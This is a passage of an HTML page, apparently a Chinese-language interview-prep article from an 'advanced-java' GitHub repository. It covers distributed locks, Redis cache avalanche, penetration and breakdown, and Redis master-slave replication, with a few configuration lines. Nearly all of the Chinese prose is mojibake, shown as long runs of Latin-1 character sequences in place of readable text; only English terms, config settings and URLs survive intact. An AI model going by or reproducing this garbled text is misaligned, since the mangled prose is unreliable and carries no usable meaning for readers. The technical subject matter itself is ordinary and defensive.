zookeeper è·å–åˆ†å¸ƒå¼é”ï¼Œç¡®ä¿åŒä¸€æ—¶é—´ï¼Œåªèƒ½æœ‰ä¸€ä¸ªç³»ç»Ÿå®ä¾‹åœ¨æ“ä½œæŸä¸ª keyï¼Œåˆ«äººéƒ½ä¸å…è®¸è¯»å’Œå†™ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/zookeeper-distributed-lock.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/zookeeper-distributed-lock.png" alt="zookeeper-distributed-lock"></a></p><p>ä½ è¦å†™å…¥ç¼“å­˜çš„æ•°æ®ï¼Œéƒ½æ˜¯ä» mysql é‡ŒæŸ¥å‡ºæ¥çš„ï¼Œéƒ½å¾—å†™å…¥ mysql ä¸­ï¼Œå†™å…¥ mysql ä¸­çš„æ—¶å€™å¿…é¡»ä¿å­˜ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œä» mysql æŸ¥å‡ºæ¥çš„æ—¶å€™ï¼Œæ—¶é—´æˆ³ä¹ŸæŸ¥å‡ºæ¥ã€‚</p><p>æ¯æ¬¡è¦<strong>å†™ä¹‹å‰ï¼Œå…ˆåˆ¤æ–­</strong>ä¸€ä¸‹å½“å‰è¿™ä¸ª value çš„æ—¶é—´æˆ³æ˜¯å¦æ¯”ç¼“å­˜é‡Œçš„ value çš„æ—¶é—´æˆ³è¦æ–°ã€‚å¦‚æœæ˜¯çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥å†™ï¼Œå¦åˆ™ï¼Œå°±ä¸èƒ½ç”¨æ—§çš„æ•°æ®è¦†ç›–æ–°çš„æ•°æ®ã€‚</p><h1><span id="äº†è§£ä»€ä¹ˆæ˜¯-redis-çš„é›ªå´©-ç©¿é€å’Œå‡»ç©¿redis-å´©æºƒä¹‹åä¼šæ€ä¹ˆæ ·ç³»ç»Ÿè¯¥å¦‚ä½•åº”å¯¹è¿™ç§æƒ…å†µå¦‚ä½•å¤„ç†-redis-çš„ç©¿é€">äº†è§£ä»€ä¹ˆæ˜¯ redis çš„é›ªå´©ã€ç©¿é€å’Œå‡»ç©¿ï¼Ÿredis å´©æºƒä¹‹åä¼šæ€ä¹ˆæ ·ï¼Ÿç³»ç»Ÿè¯¥å¦‚ä½•åº”å¯¹è¿™ç§æƒ…å†µï¼Ÿå¦‚ä½•å¤„ç† redis çš„ç©¿é€ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®è¿™æ˜¯é—®åˆ°ç¼“å­˜å¿…é—®çš„ï¼Œå› ä¸ºç¼“å­˜é›ªå´©å’Œç©¿é€ï¼Œæ˜¯ç¼“å­˜æœ€å¤§çš„ä¸¤ä¸ªé—®é¢˜ï¼Œè¦ä¹ˆä¸å‡ºç°ï¼Œä¸€æ—¦å‡ºç°å°±æ˜¯è‡´å‘½æ€§çš„é—®é¢˜ï¼Œæ‰€ä»¥é¢è¯•å®˜ä¸€å®šä¼šé—®ä½ ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="ç¼“å­˜é›ªå´©">ç¼“å­˜é›ªå´©</span></h3><p>å¯¹äºç³»ç»Ÿ Aï¼Œå‡è®¾æ¯å¤©é«˜å³°æœŸæ¯ç§’ 5000 ä¸ªè¯·æ±‚ï¼Œæœ¬æ¥ç¼“å­˜åœ¨é«˜å³°æœŸå¯ä»¥æ‰›ä½æ¯ç§’ 4000 ä¸ªè¯·æ±‚ï¼Œä½†æ˜¯ç¼“å­˜æœºå™¨æ„å¤–å‘ç”Ÿäº†å…¨ç›˜å®•æœºã€‚ç¼“å­˜æŒ‚äº†ï¼Œæ­¤æ—¶ 1 ç§’ 5000 ä¸ªè¯·æ±‚å…¨éƒ¨è½æ•°æ®åº“ï¼Œæ•°æ®åº“å¿…ç„¶æ‰›ä¸ä½ï¼Œå®ƒä¼šæŠ¥ä¸€ä¸‹è­¦ï¼Œç„¶åå°±æŒ‚äº†ã€‚æ­¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ä»€ä¹ˆç‰¹åˆ«çš„æ–¹æ¡ˆæ¥å¤„ç†è¿™ä¸ªæ•…éšœï¼ŒDBA å¾ˆç€æ€¥ï¼Œé‡å¯æ•°æ®åº“ï¼Œä½†æ˜¯æ•°æ®åº“ç«‹é©¬åˆè¢«æ–°çš„æµé‡ç»™æ‰“æ­»äº†ã€‚</p><p>è¿™å°±æ˜¯ç¼“å­˜é›ªå´©ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-avalanche.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-avalanche.png" alt="redis-caching-avalanche"></a></p><p>å¤§çº¦åœ¨ 3 å¹´å‰ï¼Œå›½å†…æ¯”è¾ƒçŸ¥åçš„ä¸€ä¸ªäº’è”ç½‘å…¬å¸ï¼Œæ›¾å› ä¸ºç¼“å­˜äº‹æ•…ï¼Œå¯¼è‡´é›ªå´©ï¼Œåå°ç³»ç»Ÿå…¨éƒ¨å´©æºƒï¼Œäº‹æ•…ä»å½“å¤©ä¸‹åˆæŒç»­åˆ°æ™šä¸Šå‡Œæ™¨ 3~4 ç‚¹ï¼Œå…¬å¸æŸå¤±äº†å‡ åƒä¸‡ã€‚</p><p>ç¼“å­˜é›ªå´©çš„äº‹å‰äº‹ä¸­äº‹åçš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ul><li>äº‹å‰ï¼šredis é«˜å¯ç”¨ï¼Œä¸»ä»+å“¨å…µï¼Œredis clusterï¼Œé¿å…å…¨ç›˜å´©æºƒã€‚</li><li>äº‹ä¸­ï¼šæœ¬åœ° ehcache ç¼“å­˜ + hystrix é™æµ&amp;é™çº§ï¼Œé¿å… MySQL è¢«æ‰“æ­»ã€‚</li><li>äº‹åï¼šredis æŒä¹…åŒ–ï¼Œä¸€æ—¦é‡å¯ï¼Œè‡ªåŠ¨ä»ç£ç›˜ä¸ŠåŠ è½½æ•°æ®ï¼Œå¿«é€Ÿæ¢å¤ç¼“å­˜æ•°æ®ã€‚</li></ul><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-avalanche-solution.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-avalanche-solution.png" alt="redis-caching-avalanche-solution"></a></p><p>ç”¨æˆ·å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œç³»ç»Ÿ A æ”¶åˆ°è¯·æ±‚åï¼Œå…ˆæŸ¥æœ¬åœ° ehcache ç¼“å­˜ï¼Œå¦‚æœæ²¡æŸ¥åˆ°å†æŸ¥ redisã€‚å¦‚æœ ehcache å’Œ redis éƒ½æ²¡æœ‰ï¼Œå†æŸ¥æ•°æ®åº“ï¼Œå°†æ•°æ®åº“ä¸­çš„ç»“æœï¼Œå†™å…¥ ehcache å’Œ redis ä¸­ã€‚</p><p>é™æµç»„ä»¶ï¼Œå¯ä»¥è®¾ç½®æ¯ç§’çš„è¯·æ±‚ï¼Œæœ‰å¤šå°‘èƒ½é€šè¿‡ç»„ä»¶ï¼Œå‰©ä½™çš„æœªé€šè¿‡çš„è¯·æ±‚ï¼Œæ€ä¹ˆåŠï¼Ÿ<strong>èµ°é™çº§</strong>ï¼å¯ä»¥è¿”å›ä¸€äº›é»˜è®¤çš„å€¼ï¼Œæˆ–è€…å‹æƒ…æç¤ºï¼Œæˆ–è€…ç©ºç™½çš„å€¼ã€‚</p><p>å¥½å¤„ï¼š</p><ul><li>æ•°æ®åº“ç»å¯¹ä¸ä¼šæ­»ï¼Œé™æµç»„ä»¶ç¡®ä¿äº†æ¯ç§’åªæœ‰å¤šå°‘ä¸ªè¯·æ±‚èƒ½é€šè¿‡ã€‚</li><li>åªè¦æ•°æ®åº“ä¸æ­»ï¼Œå°±æ˜¯è¯´ï¼Œå¯¹ç”¨æˆ·æ¥è¯´ï¼Œ2&#x2F;5 çš„è¯·æ±‚éƒ½æ˜¯å¯ä»¥è¢«å¤„ç†çš„ã€‚</li><li>åªè¦æœ‰ 2&#x2F;5 çš„è¯·æ±‚å¯ä»¥è¢«å¤„ç†ï¼Œå°±æ„å‘³ç€ä½ çš„ç³»ç»Ÿæ²¡æ­»ï¼Œå¯¹ç”¨æˆ·æ¥è¯´ï¼Œå¯èƒ½å°±æ˜¯ç‚¹å‡»å‡ æ¬¡åˆ·ä¸å‡ºæ¥é¡µé¢ï¼Œä½†æ˜¯å¤šç‚¹å‡ æ¬¡ï¼Œå°±å¯ä»¥åˆ·å‡ºæ¥ä¸€æ¬¡ã€‚</li></ul><h3><span id="ç¼“å­˜ç©¿é€">ç¼“å­˜ç©¿é€</span></h3><p>å¯¹äºç³»ç»ŸAï¼Œå‡è®¾ä¸€ç§’ 5000 ä¸ªè¯·æ±‚ï¼Œç»“æœå…¶ä¸­ 4000 ä¸ªè¯·æ±‚æ˜¯é»‘å®¢å‘å‡ºçš„æ¶æ„æ”»å‡»ã€‚</p><p>é»‘å®¢å‘å‡ºçš„é‚£ 4000 ä¸ªæ”»å‡»ï¼Œç¼“å­˜ä¸­æŸ¥ä¸åˆ°ï¼Œæ¯æ¬¡ä½ å»æ•°æ®åº“é‡ŒæŸ¥ï¼Œä¹ŸæŸ¥ä¸åˆ°ã€‚</p><p>ä¸¾ä¸ªæ —å­ã€‚æ•°æ®åº“ id æ˜¯ä» 1 å¼€å§‹çš„ï¼Œç»“æœé»‘å®¢å‘è¿‡æ¥çš„è¯·æ±‚ id å…¨éƒ¨éƒ½æ˜¯è´Ÿæ•°ã€‚è¿™æ ·çš„è¯ï¼Œç¼“å­˜ä¸­ä¸ä¼šæœ‰ï¼Œè¯·æ±‚æ¯æ¬¡éƒ½â€œ<strong>è§†ç¼“å­˜äºæ— ç‰©</strong>â€ï¼Œç›´æ¥æŸ¥è¯¢æ•°æ®åº“ã€‚è¿™ç§æ¶æ„æ”»å‡»åœºæ™¯çš„ç¼“å­˜ç©¿é€å°±ä¼šç›´æ¥æŠŠæ•°æ®åº“ç»™æ‰“æ­»ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-penetration.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-penetration.png" alt="redis-caching-penetration"></a></p><p>è§£å†³æ–¹å¼å¾ˆç®€å•ï¼Œæ¯æ¬¡ç³»ç»Ÿ A ä»æ•°æ®åº“ä¸­åªè¦æ²¡æŸ¥åˆ°ï¼Œå°±å†™ä¸€ä¸ªç©ºå€¼åˆ°ç¼“å­˜é‡Œå»ï¼Œæ¯”å¦‚ <code>set -999 UNKNOWN</code>ã€‚ç„¶åè®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œè¿™æ ·çš„è¯ï¼Œä¸‹æ¬¡æœ‰ç›¸åŒçš„ key æ¥è®¿é—®çš„æ—¶å€™ï¼Œåœ¨ç¼“å­˜å¤±æ•ˆä¹‹å‰ï¼Œéƒ½å¯ä»¥ç›´æ¥ä»ç¼“å­˜ä¸­å–æ•°æ®ã€‚</p><h3><span id="ç¼“å­˜å‡»ç©¿">ç¼“å­˜å‡»ç©¿</span></h3><p>ç¼“å­˜å‡»ç©¿ï¼Œå°±æ˜¯è¯´æŸä¸ª key éå¸¸çƒ­ç‚¹ï¼Œè®¿é—®éå¸¸é¢‘ç¹ï¼Œå¤„äºé›†ä¸­å¼é«˜å¹¶å‘è®¿é—®çš„æƒ…å†µï¼Œå½“è¿™ä¸ª key åœ¨å¤±æ•ˆçš„ç¬é—´ï¼Œå¤§é‡çš„è¯·æ±‚å°±å‡»ç©¿äº†ç¼“å­˜ï¼Œç›´æ¥è¯·æ±‚æ•°æ®åº“ï¼Œå°±åƒæ˜¯åœ¨ä¸€é“å±éšœä¸Šå‡¿å¼€äº†ä¸€ä¸ªæ´ã€‚</p><p>ä¸åŒåœºæ™¯ä¸‹çš„è§£å†³æ–¹å¼å¯å¦‚ä¸‹ï¼š</p><ul><li>è‹¥ç¼“å­˜çš„æ•°æ®æ˜¯åŸºæœ¬ä¸ä¼šå‘ç”Ÿæ›´æ–°çš„ï¼Œåˆ™å¯å°è¯•å°†è¯¥çƒ­ç‚¹æ•°æ®è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸã€‚</li><li>è‹¥ç¼“å­˜çš„æ•°æ®æ›´æ–°ä¸é¢‘ç¹ï¼Œä¸”ç¼“å­˜åˆ·æ–°çš„æ•´ä¸ªæµç¨‹è€—æ—¶è¾ƒå°‘çš„æƒ…å†µä¸‹ï¼Œåˆ™å¯ä»¥é‡‡ç”¨åŸºäº redisã€zookeeper ç­‰åˆ†å¸ƒå¼ä¸­é—´ä»¶çš„åˆ†å¸ƒå¼äº’æ–¥é”ï¼Œæˆ–è€…æœ¬åœ°äº’æ–¥é”ä»¥ä¿è¯ä»…å°‘é‡çš„è¯·æ±‚èƒ½è¯·æ±‚æ•°æ®åº“å¹¶é‡æ–°æ„å»ºç¼“å­˜ï¼Œå…¶ä½™çº¿ç¨‹åˆ™åœ¨é”é‡Šæ”¾åèƒ½è®¿é—®åˆ°æ–°ç¼“å­˜ã€‚</li><li>è‹¥ç¼“å­˜çš„æ•°æ®æ›´æ–°é¢‘ç¹æˆ–è€…ç¼“å­˜åˆ·æ–°çš„æµç¨‹è€—æ—¶è¾ƒé•¿çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨å®šæ—¶çº¿ç¨‹åœ¨ç¼“å­˜è¿‡æœŸå‰ä¸»åŠ¨çš„é‡æ–°æ„å»ºç¼“å­˜æˆ–è€…å»¶åç¼“å­˜çš„è¿‡æœŸæ—¶é—´ï¼Œä»¥ä¿è¯æ‰€æœ‰çš„è¯·æ±‚èƒ½ä¸€ç›´è®¿é—®åˆ°å¯¹åº”çš„ç¼“å­˜ã€‚</li></ul><h1><span id="redis-ä¸»ä»æ¶æ„">Redis ä¸»ä»æ¶æ„</span></h1><p>å•æœºçš„ redisï¼Œèƒ½å¤Ÿæ‰¿è½½çš„ QPS å¤§æ¦‚å°±åœ¨ä¸Šä¸‡åˆ°å‡ ä¸‡ä¸ç­‰ã€‚å¯¹äºç¼“å­˜æ¥è¯´ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨æ¥æ”¯æ’‘<strong>è¯»é«˜å¹¶å‘</strong>çš„ã€‚å› æ­¤æ¶æ„åšæˆä¸»ä»(master-slave)æ¶æ„ï¼Œä¸€ä¸»å¤šä»ï¼Œä¸»è´Ÿè´£å†™ï¼Œå¹¶ä¸”å°†æ•°æ®å¤åˆ¶åˆ°å…¶å®ƒçš„ slave èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹è´Ÿè´£è¯»ã€‚æ‰€æœ‰çš„<strong>è¯»è¯·æ±‚å…¨éƒ¨èµ°ä»èŠ‚ç‚¹</strong>ã€‚è¿™æ ·ä¹Ÿå¯ä»¥å¾ˆè½»æ¾å®ç°æ°´å¹³æ‰©å®¹ï¼Œ<strong>æ”¯æ’‘è¯»é«˜å¹¶å‘</strong>ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave.png" alt="redis-master-slave"></a></p><p>redis replication -&gt; ä¸»ä»æ¶æ„ -&gt; è¯»å†™åˆ†ç¦» -&gt; æ°´å¹³æ‰©å®¹æ”¯æ’‘è¯»é«˜å¹¶å‘</p><h2><span id="redis-replication-çš„æ ¸å¿ƒæœºåˆ¶">redis replication çš„æ ¸å¿ƒæœºåˆ¶</span></h2><ul><li>redis é‡‡ç”¨<strong>å¼‚æ­¥æ–¹å¼</strong>å¤åˆ¶æ•°æ®åˆ° slave èŠ‚ç‚¹ï¼Œä¸è¿‡ redis2.8 å¼€å§‹ï¼Œslave node ä¼šå‘¨æœŸæ€§åœ°ç¡®è®¤è‡ªå·±æ¯æ¬¡å¤åˆ¶çš„æ•°æ®é‡ï¼›</li><li>ä¸€ä¸ª master node æ˜¯å¯ä»¥é…ç½®å¤šä¸ª slave node çš„ï¼›</li><li>slave node ä¹Ÿå¯ä»¥è¿æ¥å…¶ä»–çš„ slave nodeï¼›</li><li>slave node åšå¤åˆ¶çš„æ—¶å€™ï¼Œä¸ä¼š block master node çš„æ­£å¸¸å·¥ä½œï¼›</li><li>slave node åœ¨åšå¤åˆ¶çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼š block å¯¹è‡ªå·±çš„æŸ¥è¯¢æ“ä½œï¼Œå®ƒä¼šç”¨æ—§çš„æ•°æ®é›†æ¥æä¾›æœåŠ¡ï¼›ä½†æ˜¯å¤åˆ¶å®Œæˆçš„æ—¶å€™ï¼Œéœ€è¦åˆ é™¤æ—§æ•°æ®é›†ï¼ŒåŠ è½½æ–°æ•°æ®é›†ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šæš‚åœå¯¹å¤–æœåŠ¡äº†ï¼›</li><li>slave node ä¸»è¦ç”¨æ¥è¿›è¡Œæ¨ªå‘æ‰©å®¹ï¼Œåšè¯»å†™åˆ†ç¦»ï¼Œæ‰©å®¹çš„ slave node å¯ä»¥æé«˜è¯»çš„ååé‡ã€‚</li></ul><p>æ³¨æ„ï¼Œå¦‚æœé‡‡ç”¨äº†ä¸»ä»æ¶æ„ï¼Œé‚£ä¹ˆå»ºè®®å¿…é¡»<strong>å¼€å¯</strong> master node çš„<a href="https://github.com/Disda-coding/advanced-java/blob/master/docs/high-concurrency/redis-persistence.md">æŒä¹…åŒ–</a>ï¼Œä¸å»ºè®®ç”¨ slave node ä½œä¸º master node çš„æ•°æ®çƒ­å¤‡ï¼Œå› ä¸ºé‚£æ ·çš„è¯ï¼Œå¦‚æœä½ å…³æ‰ master çš„æŒä¹…åŒ–ï¼Œå¯èƒ½åœ¨ master å®•æœºé‡å¯çš„æ—¶å€™æ•°æ®æ˜¯ç©ºçš„ï¼Œç„¶åå¯èƒ½ä¸€ç»è¿‡å¤åˆ¶ï¼Œ slave node çš„æ•°æ®ä¹Ÿä¸¢äº†ã€‚</p><p>å¦å¤–ï¼Œmaster çš„å„ç§å¤‡ä»½æ–¹æ¡ˆï¼Œä¹Ÿéœ€è¦åšã€‚ä¸‡ä¸€æœ¬åœ°çš„æ‰€æœ‰æ–‡ä»¶ä¸¢å¤±äº†ï¼Œä»å¤‡ä»½ä¸­æŒ‘é€‰ä¸€ä»½ rdb å»æ¢å¤ masterï¼Œè¿™æ ·æ‰èƒ½<strong>ç¡®ä¿å¯åŠ¨çš„æ—¶å€™ï¼Œæ˜¯æœ‰æ•°æ®çš„</strong>ï¼Œå³ä½¿é‡‡ç”¨äº†åç»­è®²è§£çš„<a href="https://github.com/Disda-coding/advanced-java/blob/master/docs/high-concurrency/redis-sentinel.md">é«˜å¯ç”¨æœºåˆ¶</a>ï¼Œslave node å¯ä»¥è‡ªåŠ¨æ¥ç®¡ master nodeï¼Œä½†ä¹Ÿå¯èƒ½ sentinel è¿˜æ²¡æ£€æµ‹åˆ° master failureï¼Œmaster node å°±è‡ªåŠ¨é‡å¯äº†ï¼Œè¿˜æ˜¯å¯èƒ½å¯¼è‡´ä¸Šé¢æ‰€æœ‰çš„ slave node æ•°æ®è¢«æ¸…ç©ºã€‚</p><h2><span id="redis-ä¸»ä»å¤åˆ¶çš„æ ¸å¿ƒåŸç†">redis ä¸»ä»å¤åˆ¶çš„æ ¸å¿ƒåŸç†</span></h2><p>å½“å¯åŠ¨ä¸€ä¸ª slave node çš„æ—¶å€™ï¼Œå®ƒä¼šå‘é€ä¸€ä¸ª <code>PSYNC</code> å‘½ä»¤ç»™ master nodeã€‚</p><p>å¦‚æœè¿™æ˜¯ slave node åˆæ¬¡è¿æ¥åˆ° master nodeï¼Œé‚£ä¹ˆä¼šè§¦å‘ä¸€æ¬¡ <code>full resynchronization</code> å…¨é‡å¤åˆ¶ã€‚æ­¤æ—¶ master ä¼šå¯åŠ¨ä¸€ä¸ªåå°çº¿ç¨‹ï¼Œå¼€å§‹ç”Ÿæˆä¸€ä»½ <code>RDB</code> å¿«ç…§æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜ä¼šå°†ä»å®¢æˆ·ç«¯ client æ–°æ”¶åˆ°çš„æ‰€æœ‰å†™å‘½ä»¤ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚<code>RDB</code> æ–‡ä»¶ç”Ÿæˆå®Œæ¯•åï¼Œ master ä¼šå°†è¿™ä¸ª <code>RDB</code> å‘é€ç»™ slaveï¼Œslave ä¼šå…ˆ<strong>å†™å…¥æœ¬åœ°ç£ç›˜ï¼Œç„¶åå†ä»æœ¬åœ°ç£ç›˜åŠ è½½åˆ°å†…å­˜</strong>ä¸­ï¼Œæ¥ç€ master ä¼šå°†å†…å­˜ä¸­ç¼“å­˜çš„å†™å‘½ä»¤å‘é€åˆ° slaveï¼Œslave ä¹Ÿä¼šåŒæ­¥è¿™äº›æ•°æ®ã€‚slave node å¦‚æœè·Ÿ master node æœ‰ç½‘ç»œæ•…éšœï¼Œæ–­å¼€äº†è¿æ¥ï¼Œä¼šè‡ªåŠ¨é‡è¿ï¼Œè¿æ¥ä¹‹å master node ä»…ä¼šå¤åˆ¶ç»™ slave éƒ¨åˆ†ç¼ºå°‘çš„æ•°æ®ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave-replication.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave-replication.png" alt="redis-master-slave-replication"></a></p><h3><span id="ä¸»ä»å¤åˆ¶çš„æ–­ç‚¹ç»­ä¼ ">ä¸»ä»å¤åˆ¶çš„æ–­ç‚¹ç»­ä¼ </span></h3><p>ä» redis2.8 å¼€å§‹ï¼Œå°±æ”¯æŒä¸»ä»å¤åˆ¶çš„æ–­ç‚¹ç»­ä¼ ï¼Œå¦‚æœä¸»ä»å¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œç½‘ç»œè¿æ¥æ–­æ‰äº†ï¼Œé‚£ä¹ˆå¯ä»¥æ¥ç€ä¸Šæ¬¡å¤åˆ¶çš„åœ°æ–¹ï¼Œç»§ç»­å¤åˆ¶ä¸‹å»ï¼Œè€Œä¸æ˜¯ä»å¤´å¼€å§‹å¤åˆ¶ä¸€ä»½ã€‚</p><p>master node ä¼šåœ¨å†…å­˜ä¸­ç»´æŠ¤ä¸€ä¸ª backlogï¼Œmaster å’Œ slave éƒ½ä¼šä¿å­˜ä¸€ä¸ª replica offset è¿˜æœ‰ä¸€ä¸ª master run idï¼Œoffset å°±æ˜¯ä¿å­˜åœ¨ backlog ä¸­çš„ã€‚å¦‚æœ master å’Œ slave ç½‘ç»œè¿æ¥æ–­æ‰äº†ï¼Œslave ä¼šè®© master ä»ä¸Šæ¬¡ replica offset å¼€å§‹ç»§ç»­å¤åˆ¶ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„ offsetï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œä¸€æ¬¡ <code>resynchronization</code>ã€‚</p><blockquote><p>å¦‚æœæ ¹æ® host+ip å®šä½ master nodeï¼Œæ˜¯ä¸é è°±çš„ï¼Œå¦‚æœ master node é‡å¯æˆ–è€…æ•°æ®å‡ºç°äº†å˜åŒ–ï¼Œé‚£ä¹ˆ slave node åº”è¯¥æ ¹æ®ä¸åŒçš„ run id åŒºåˆ†ã€‚</p></blockquote><h3><span id="æ— ç£ç›˜åŒ–å¤åˆ¶">æ— ç£ç›˜åŒ–å¤åˆ¶</span></h3><p>master åœ¨å†…å­˜ä¸­ç›´æ¥åˆ›å»º <code>RDB</code>ï¼Œç„¶åå‘é€ç»™ slaveï¼Œä¸ä¼šåœ¨è‡ªå·±æœ¬åœ°è½åœ°ç£ç›˜äº†ã€‚åªéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­å¼€å¯ <code>repl-diskless-sync yes</code> å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repl-diskless-sync yes</span><br><span class="line"></span><br><span class="line"># ç­‰å¾… 5s åå†å¼€å§‹å¤åˆ¶ï¼Œå› ä¸ºè¦ç­‰æ›´å¤š slave é‡æ–°è¿æ¥è¿‡æ¥</span><br><span class="line">repl-diskless-sync-delay 5</span><br></pre></td></tr></table></figure><h3><span id="è¿‡æœŸ-key-å¤„ç†">è¿‡æœŸ key å¤„ç†</span></h3><p>slave ä¸ä¼šè¿‡æœŸ keyï¼Œåªä¼šç­‰å¾… master è¿‡æœŸ keyã€‚å¦‚æœ master è¿‡æœŸäº†ä¸€ä¸ª keyï¼Œæˆ–è€…é€šè¿‡ LRU æ·˜æ±°äº†ä¸€ä¸ª keyï¼Œé‚£ä¹ˆä¼šæ¨¡æ‹Ÿä¸€æ¡ del å‘½ä»¤å‘é€ç»™ slaveã€‚</p><h2><span id="å¤åˆ¶çš„å®Œæ•´æµç¨‹">å¤åˆ¶çš„å®Œæ•´æµç¨‹</span></h2><p>slave node å¯åŠ¨æ—¶ï¼Œä¼šåœ¨è‡ªå·±æœ¬åœ°ä¿å­˜ master node çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ master node çš„<code>host</code>å’Œ<code>ip</code>ï¼Œä½†æ˜¯å¤åˆ¶æµç¨‹æ²¡å¼€å§‹ã€‚</p><p>slave node å†…éƒ¨æœ‰ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯ç§’æ£€æŸ¥æ˜¯å¦æœ‰æ–°çš„ master node è¦è¿æ¥å’Œå¤åˆ¶ï¼Œå¦‚æœå‘ç°ï¼Œå°±è·Ÿ master node å»ºç«‹ socket ç½‘ç»œè¿æ¥ã€‚ç„¶å slave node å‘é€ <code>ping</code> å‘½ä»¤ç»™ master nodeã€‚å¦‚æœ master è®¾ç½®äº† requirepassï¼Œé‚£ä¹ˆ slave node å¿…é¡»å‘é€ masterauth çš„å£ä»¤è¿‡å»è¿›è¡Œè®¤è¯ã€‚master node <strong>ç¬¬ä¸€æ¬¡æ‰§è¡Œå…¨é‡å¤åˆ¶</strong>ï¼Œå°†æ‰€æœ‰æ•°æ®å‘ç»™ slave nodeã€‚è€Œåœ¨åç»­ï¼Œmaster node æŒç»­å°†å†™å‘½ä»¤ï¼Œå¼‚æ­¥å¤åˆ¶ç»™ slave nodeã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave-replication-detail.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave-replication-detail.png" alt="redis-master-slave-replication-detail"></a></p><h3><span id="å…¨é‡å¤åˆ¶">å…¨é‡å¤åˆ¶</span></h3><ul><li>master æ‰§è¡Œ bgsave ï¼Œåœ¨æœ¬åœ°ç”Ÿæˆä¸€ä»½ rdb å¿«ç…§æ–‡ä»¶ã€‚</li><li>master node å°† rdb å¿«ç…§æ–‡ä»¶å‘é€ç»™ slave nodeï¼Œå¦‚æœ rdb å¤åˆ¶æ—¶é—´è¶…è¿‡ 60ç§’ï¼ˆrepl-timeoutï¼‰ï¼Œé‚£ä¹ˆ slave node å°±ä¼šè®¤ä¸ºå¤åˆ¶å¤±è´¥ï¼Œå¯ä»¥é€‚å½“è°ƒå¤§è¿™ä¸ªå‚æ•°(å¯¹äºåƒå…†ç½‘å¡çš„æœºå™¨ï¼Œä¸€èˆ¬æ¯ç§’ä¼ è¾“ 100MBï¼Œ6G æ–‡ä»¶ï¼Œå¾ˆå¯èƒ½è¶…è¿‡ 60s)</li><li>master node åœ¨ç”Ÿæˆ rdb æ—¶ï¼Œä¼šå°†æ‰€æœ‰æ–°çš„å†™å‘½ä»¤ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œåœ¨ slave node ä¿å­˜äº† rdb ä¹‹åï¼Œå†å°†æ–°çš„å†™å‘½ä»¤å¤åˆ¶ç»™ slave nodeã€‚</li><li>å¦‚æœåœ¨å¤åˆ¶æœŸé—´ï¼Œå†…å­˜ç¼“å†²åŒºæŒç»­æ¶ˆè€—è¶…è¿‡ 64MBï¼Œæˆ–è€…ä¸€æ¬¡æ€§è¶…è¿‡ 256MBï¼Œé‚£ä¹ˆåœæ­¢å¤åˆ¶ï¼Œå¤åˆ¶å¤±è´¥ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-output-buffer-limit slave 256MB 64MB 60</span><br></pre></td></tr></table></figure><ul><li>slave node æ¥æ”¶åˆ° rdb ä¹‹åï¼Œæ¸…ç©ºè‡ªå·±çš„æ—§æ•°æ®ï¼Œç„¶åé‡æ–°åŠ è½½ rdb åˆ°è‡ªå·±çš„å†…å­˜ä¸­ï¼ŒåŒæ—¶<strong>åŸºäºæ—§çš„æ•°æ®ç‰ˆæœ¬</strong>å¯¹å¤–æä¾›æœåŠ¡ã€‚</li><li>å¦‚æœ slave node å¼€å¯äº† AOFï¼Œé‚£ä¹ˆä¼šç«‹å³æ‰§è¡Œ BGREWRITEAOFï¼Œé‡å†™ AOFã€‚</li></ul><h3><span id="å¢é‡å¤åˆ¶">å¢é‡å¤åˆ¶</span></h3><ul><li>å¦‚æœå…¨é‡å¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œmaster-slave ç½‘ç»œè¿æ¥æ–­æ‰ï¼Œé‚£ä¹ˆ slave é‡æ–°è¿æ¥ master 